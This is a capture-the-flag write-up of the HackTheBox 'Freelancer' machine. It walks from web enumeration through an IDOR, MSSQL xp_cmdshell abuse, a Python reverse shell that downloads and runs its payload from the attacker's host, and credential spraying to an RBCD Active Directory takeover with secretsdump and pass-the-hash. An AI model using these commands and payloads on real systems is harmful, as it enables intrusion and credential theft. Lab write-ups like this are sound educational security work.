### Initial Recon and Web Enumeration

My nmap scan uncovered a number of standard windows ports. As usual I decided to take a look at the web server on port 80 first. The server seems to be using Django, an open source web framework, for templating. I did some quick subdomain and directory enumeration and found several seemingly important details.

```
ffuf -u http://freelancer.htb -H "Host: FUZZ.freelancer.htb" -w /usr/share/wordlists/subdomains/n0kovo_subdomains/n0kovo_subdomains_large.txt
```

```
ffuf -u http://freelancer.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -e ".php,.txt,.html"
```

```
ffuf -u http://dc.freelancer.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -e ".php,.txt,.html"
```

These scans revealed an important **subdomain for the domain controller** (`dc.freelancer.htb`) and an **admin login portal**. At this point, I began snooping around the site as much as possible.

### User and Admin Exploration

I noticed that I was able to sign up for an account, but didn't see anything I could abuse further once I had done so. I then tried several insecure username and password matches for the admin portal, but was unsuccessful. At this point I was a bit stumped, so I kept digging through my options as a user on the site.

As a "freelancer" user, I also have the option to register as an employer, but each time I tried, I was given an error, and told that my account was not activated. After more than a little head scratching, I decided to try the "forgot password" link. I entered the information I'd used to sign up, reset my password, and logged into my brand new "employer" account. This gave me access to new features, like creating job postings, but nothing particularly interesting stood out—until I began investigating the QR code login feature.

### Insecure Direct Object Reference (IDOR) Vulnerability

The code is meant to allow users to log in on their phones without credentials, and acts as a one time passcode. I used a browser extension to scan the code, and checked Burp to see if anything interesting had happened. Burp thankfully automatically decodes base64 in its "decoder" window, revealing that the number in the URL corresponds to my user's ID. This is an Insecure Direct Object Reference (IDOR) vulnerability. I "brute forced" the admin ID of 2 in the URL string and gained access to an admin account.

### Admin Panel and SQL Injection

The admin panel has a built in SQL terminal. I unfortunately had to learn the hard way to not use a proxy while on the admin panel, as it prevented the SQL terminal from working properly. I almost gave up on this route due to this!

I used attacks I found on [this hacktricks page](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server) to attempt to gain a foothold from this terminal.  The path that ended up working was impersonating the sa account. 

```
# Find users you can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
# Check if the user "sa" or any other high privileged user is mentioned

# Impersonate sa user
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

As the sa user I can enable xp_cmdshell.

```
EXECUTE AS LOGIN = 'sa'
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
```

```
EXECUTE AS LOGIN = 'sa'
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

Now I'll upload nc to the box, and use it to call out to my local machine for a reverse shell.

```
EXECUTE AS LOGIN = 'sa'
EXEC xp_cmdshell 'powershell -noprofile -Command "Invoke-WebRequest http://10.10.14.34:8000/nc.exe -OutFile C:\Users\Public\nc.exe" & C:\Users\Public\nc.exe 10.10.14.34 4444 -e powershell';
```

Unfortunately, no dice. I can only assume I'm being shot down by Windows Defender. However, Django is written in Python, so a Python reverse shell might bear more fruit. 

```
import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.34",4444))

p=subprocess.Popen(["powershell"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
```

```
EXECUTE AS LOGIN = 'sa'
EXEC xp_cmdshell 'powershell -noprofile -Command "Invoke-WebRequest http://10.10.14.31:8000/totallynormalpythonscript.py -OutFile C:\Users\Public\totallynormalpythonscript.py" & python C:\Users\Public\totallynormalpythonscript.py';
```

Sure enough, I get my foothold! Unfortunately Defender isn't fond of winPEAS, so I'll have to sift through information by hand.

### Credential Discovery, Password Spraying and SMB Access

In the downloads folder for my user, I find an interesting config file.

```
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="FREELANCER\sql_svc"
SQLSVCPASSWORD="IL0.........."
SQLSYSADMINACCOUNTS="FREELANCER\Administrator"
SECURITYMODE="SQL"
SAPWD="t3............"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

I net myself two cleartext passwords. From here I want to test them against SMB, but first I'll need a list of users.

```
net user
```

I then used crackmapexec (CME) to test them out.

```
crackmapexec smb 10.10.11.5 -u users.txt -p IL0...........
```

I get a hit on mikasaAckerman (which fans of the popular anime, Attack on Titan, such as myself, could have guessed without any tools).

```
mikasaAckerman|IL0...........
```

### Privilege Escalation: RunasCs

I'll now upload RunasCs.exe to the box so we can abuse these credentials for a privilege escalation. When I tried to upload tools to the box without the help of the SQL terminal earlier, defender seemed to be much more vicious about them, so we'll use the terminal for this as well. I'm not quite sure why this is the case, but this worked for me!

```
EXECUTE AS LOGIN = 'sa'
EXEC xp_cmdshell 'powershell -noprofile -Command "Invoke-WebRequest http://10.10.14.31:8000/RunasCs.exe -OutFile C:\Users\Public\RunasCs.exe"';
```

I start a new listener and await my shell

```
./RunasCs.exe mikasaAckerman IL0............. cmd.exe -r 10.10.14.31:4445
```

After a few seconds, I'm greeted by a new user account! 

### Memory Dump Analysis

Mikasa has a few interesting files in her desktop directory, one is an email, and another is what looks to be a memory dump. In users/mikasaAckerman, I start a simple python http server for exfil of the memory dump. Have I mentioned that I love it when boxes have access to python?

```
python -m http.server 64000
```

```
wget http://10.10.11.5:64000/MEMORY.7z
```

Finally, I unzip the file.

```
7z x MEMORY.7z
```

I'll now need to read the memory dump, which can be done with a variety of tools. I tried volatility first, but never got it to work. Soon after, I moved to my operation to memprocfs. This worked better, but not the way I was expecting. 

```
memprocfs -mount ./memdump -f MEMORY.DMP
```

I was about to give up on memprocfs as well, but eventually, after a lot of digging I found a file in memdump/py/plugins/regsecrets that said to download pym_regsecrets. The automatic download didn't work for me so I went to the plugins page on their github, created the folder 'pym_regsecrets' in /home/kali/.local/bin/memprocfs/plugins to mirror their directory structure, and added each of the files found on the github to it manually. This worked, and when I restarted memprocfs, the folder I mentioned earlier had several text files. One of these files contained a plaintext password. Back to CME!

```
crackmapexec smb 10.10.11.5 -u users.txt -p PWN...................
```

I get a hit on the user lorra199.

```
lorra199|PWN..................
```

From here I used evil-winrm to get a shell on the box with lorras's credentials. 

### Active Directory and Resource-Based Constrained Delegation (RBCD)

I looked around for a while and didn't find much of use. I then used bloodhound to see if there were any special AD permissions I could abuse. After a lot of troubleshooting, I discovered that the time on the box was 5 hours ahead of my local machine. I then used faketimelib to artificially add 5 hours to my own time and snatch the AD structures. 

```
faketime -f +5h bloodhound-python -c ALL -u lorra199 -p 'PWN.....................' -d freelancer.htb -ns 10.10.11.5 --zip
```

I then uploaded the files to bloodhound, and discovered that lorra was a member of AD_RECYCLEBIN. I further discovered that AD_RECYCLEBIN had generic write permission on DC2, and could modify the properties of the account. When these permissions are combined with resource-based constrained delegation (RBCD), they can be exploited for privilege escalation or lateral movement. I could even compromise the entire domain (spoiler alert).

RBCD allows an account or service to act on behalf of another account when accessing resources hosted on specific computers. However, if I can manipulate the delegation settings on a key account (like a Domain Controller), I can potentially abuse the trust relationship. Because my user has generic write permissions on DC2, I can modify various attributes of the DC2 account, including the `msDS-AllowedToActOnBehalfOfOtherIdentity` property, which is a key attribute for RBCD. In other words, I can modify the property to allow a machine I control to impersonate users when accessing services on DC2. 

To get this attack moving, I'll first need to create a new machine account using lorra's credentials. The ability to add a computer account depends on whether a user account has the `AddWorkstationToDomain` privilege. By default, ordinary users in a domain are allowed to add up to 10 computers to the domain (though administrators often change this). Thankfully our user has this privilege, and I used an impacket module to achieve this.

```
impacket-addcomputer -computer-name 'TEST$' -computer-pass 'test' -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:'PWN.......'
```

I then configured TEST$ to be able to impersonate other users when accessing services on the DC.

```
impacket-rbcd -delegate-from 'TEST$' -delegate-to 'DC$' -dc-ip 10.10.11.5 -action 'write' 'freelancer.htb/lorra199:PWN..............'        
```                         

Now I need a service ticket impersonating the administrator account. Due to the aforementioned time disparity, I'll need to use faketimelib for this as well. 

```
`faketime -f +5h impacket-getST -spn cifs/DC.freelancer.htb -impersonate Administrator -dc-ip 10.10.11.5 freelancer.htb/TEST$:test -k -no-pass`
```  

I get a service ticket back for CIFS, and add it to my environment variable.

```
export KRB5CCNAME=Administrator@cifs_DC.freelancer.htb@FREELANCER.HTB.ccache  
```

CIFS operates over SMB, so I'll need to authenticate to another service that operates over SMB. I tried psexec to begin with, again using faketimelib to account for the time difference. 

```
faketime -f +5h impacket-psexec freelancer.htb/Administrator@DC.freelancer.htb -k -no-pass 
```

This should have worked, and I'm not really sure why it didn't. Nevertheless, I persisted. I tried a different Impacket module, secretsdump, to see if I could get the NTLM hash for the administrator account, and sure enough, it worked just fine. I'm still not sure why this method worked over the other, but all's well that ends well!

```
faketime -f +5h impacket-secretsdump freelancer.htb/Administrator@DC.freelancer.htb -k -no-pass
```

```
Administrator:500:aad3b43............:0039318f...............
```

With the NT hash I can authenticate to the administrator account using evil-winrm.

```
evil-winrm -i freelancer.htb -u administrator -H '0039318f...................'
```

Lastly, I navigate to the desktop directory and type the root.txt file. 

Happy hacking everyone! 